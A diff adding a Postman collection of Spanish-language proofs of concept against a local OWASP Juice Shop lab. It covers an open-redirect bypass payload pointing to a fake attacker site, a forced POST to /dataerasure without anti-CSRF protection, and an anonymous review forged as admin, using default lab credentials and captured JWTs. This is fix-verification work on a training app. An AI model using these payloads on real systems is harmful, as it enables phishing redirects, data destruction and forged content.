@@ -1,0 +1,247 @@
+{
+  "info": {
+    "name": "Juice Shop - PoC 1 y 2 (Red Team)",
+    "description": "PoC-01 Open Redirect (CWE-601) y PoC-02 Ausencia de anti-CSRF en /dataerasure (CWE-352). Pruebas contra una instancia LOCAL autorizada de OWASP Juice Shop.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:3000", "type": "string" },
+    { "key": "email", "value": "csrf-victima@juice-sh.op", "type": "string" },
+    { "key": "password", "value": "Passw0rd!", "type": "string" },
+    { "key": "securityAnswer", "value": "test", "type": "string" },
+    { "key": "jwt", "value": "", "type": "string" },
+    { "key": "reviewMsg", "value": "", "type": "string" }
+  ],
+  "item": [
+    {
+      "name": "PoC-01 Open Redirect",
+      "item": [
+        {
+          "name": "A - Destino permitido (control, debe redirigir)",
+          "protocolProfileBehavior": { "followRedirects": false },
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/redirect?to=https://github.com/juice-shop/juice-shop",
+              "host": ["{{baseUrl}}"],
+              "path": ["redirect"],
+              "query": [
+                { "key": "to", "value": "https://github.com/juice-shop/juice-shop" }
+              ]
+            },
+            "description": "Destino que SI esta en la allowlist. Vulnerable y corregida: 302 Found con Location a GitHub. Confirma que la funcionalidad legitima se conserva."
+          }
+        },
+        {
+          "name": "B - EXPLOIT dominio externo (vulnerable: 302 / corregida: 406)",
+          "protocolProfileBehavior": { "followRedirects": false },
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/redirect?to=http://sitio-falso.example/?x=https://github.com/juice-shop/juice-shop",
+              "host": ["{{baseUrl}}"],
+              "path": ["redirect"],
+              "query": [
+                { "key": "to", "value": "http://sitio-falso.example/?x=https://github.com/juice-shop/juice-shop" }
+              ]
+            },
+            "description": "PAYLOAD DEL ATAQUE. La version vulnerable valida con includes(), asi que basta con que la URL CONTENGA un dominio permitido (?x=...github.com/juice-shop/juice-shop) para redirigir al sitio del atacante.\n\nVulnerable (v20.3.0): 302 Found, Location: http://sitio-falso.example/...\nCorregida (h4): 406 Not Acceptable, sin cabecera Location."
+          }
+        },
+        {
+          "name": "C - EXPLOIT ruta interna (vulnerable: 302 / corregida: 406)",
+          "protocolProfileBehavior": { "followRedirects": false },
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/redirect?to=/score-board?satisfyIndexOf=https://github.com/juice-shop/juice-shop",
+              "host": ["{{baseUrl}}"],
+              "path": ["redirect"],
+              "query": [
+                { "key": "to", "value": "/score-board?satisfyIndexOf=https://github.com/juice-shop/juice-shop" }
+              ]
+            },
+            "description": "Segunda variante del bypass por includes(). Vulnerable: 302. Corregida: 406."
+          }
+        }
+      ]
+    },
+    {
+      "name": "PoC-02 Ausencia de anti-CSRF (/dataerasure)",
+      "item": [
+        {
+          "name": "1 - Crear usuario victima",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{email}}\",\n  \"password\": \"{{password}}\",\n  \"passwordRepeat\": \"{{password}}\",\n  \"securityQuestion\": { \"id\": 1 },\n  \"securityAnswer\": \"{{securityAnswer}}\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/Users",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "Users"]
+            },
+            "description": "Crea la cuenta de laboratorio que hara de victima. Si ya existe, continua con el login (puede dar 400 por email duplicado)."
+          }
+        },
+        {
+          "name": "2 - Login (guarda el token de la victima)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const json = pm.response.json();",
+                  "if (json.authentication && json.authentication.token) {",
+                  "  pm.collectionVariables.set('jwt', json.authentication.token);",
+                  "  console.log('Token guardado en {{jwt}}');",
+                  "} else {",
+                  "  console.log('No se encontro token en la respuesta');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{email}}\",\n  \"password\": \"{{password}}\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/rest/user/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["rest", "user", "login"]
+            },
+            "description": "Inicia sesion como la victima. El script de 'Tests' extrae authentication.token y lo guarda en la variable {{jwt}} para la siguiente peticion."
+          }
+        },
+        {
+          "name": "3 - EXPLOIT POST /dataerasure sin token anti-CSRF",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/x-www-form-urlencoded" },
+              { "key": "Cookie", "value": "token={{jwt}}" }
+            ],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                { "key": "email", "value": "{{email}}", "type": "text" },
+                { "key": "securityAnswer", "value": "{{securityAnswer}}", "type": "text" }
+              ]
+            },
+            "url": {
+              "raw": "{{baseUrl}}/dataerasure",
+              "host": ["{{baseUrl}}"],
+              "path": ["dataerasure"]
+            },
+            "description": "La accion de estado solo depende de la cookie de sesion 'token', que el navegador adjunta automaticamente. No exige ningun token anti-CSRF impredecible, por lo que puede forzarse desde un sitio externo. Resultado: 200 OK. Esta PoC NO fue corregida en H4; queda como riesgo residual."
+          }
+        }
+      ]
+    },
+    {
+      "name": "PoC-03 Resena sin autenticacion",
+      "item": [
+        {
+          "name": "A - EXPLOIT anonimo (vulnerable: 201 / corregida: 401)",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.collectionVariables.set('reviewMsg', 'H4_POC3_' + Date.now());"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "PUT",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"message\": \"{{reviewMsg}}-anon\",\n  \"author\": \"admin@juice-sh.op\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/rest/products/1/reviews",
+              "host": ["{{baseUrl}}"],
+              "path": ["rest", "products", "1", "reviews"]
+            },
+            "description": "PUT sin cabecera Authorization (usuario no autenticado).\n\nVulnerable (v20.3.0): 201 Created; la resena se guarda sin sesion.\nCorregida (h4): 401 Unauthorized; la ruta exige autenticacion (security.isAuthorized()). Esta es la evidencia del Hito 4: sin loguearse no se puede crear una resena."
+          }
+        },
+        {
+          "name": "B - Login jim (guarda token)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const json = pm.response.json();",
+                  "if (json.authentication && json.authentication.token) {",
+                  "  pm.collectionVariables.set('jwt', json.authentication.token);",
+                  "  console.log('Token de jim guardado en {{jwt}}');",
+                  "} else {",
+                  "  console.log('No se encontro token en la respuesta');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"jim@juice-sh.op\",\n  \"password\": \"ncc-1701\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/rest/user/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["rest", "user", "login"]
+            },
+            "description": "Inicia sesion con la cuenta por defecto jim@juice-sh.op (existe en Juice Shop sin crearla). Guarda el token en {{jwt}}."
+          }
+        },
+        {
+          "name": "C - PUT autenticado crea la resena (201)",
+          "request": {
+            "method": "PUT",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Authorization", "value": "Bearer {{jwt}}" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"message\": \"{{reviewMsg}}-auth\",\n  \"author\": \"jim@juice-sh.op\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/rest/products/1/reviews",
+              "host": ["{{baseUrl}}"],
+              "path": ["rest", "products", "1", "reviews"]
+            },
+            "description": "Ahora SI con el token de jim. Responde 201 Created: un usuario autenticado si puede publicar. Demuestra que la correccion no rompe el uso normal, solo exige iniciar sesion."
+          }
+        }
+      ]
+    }
+  ]
+}
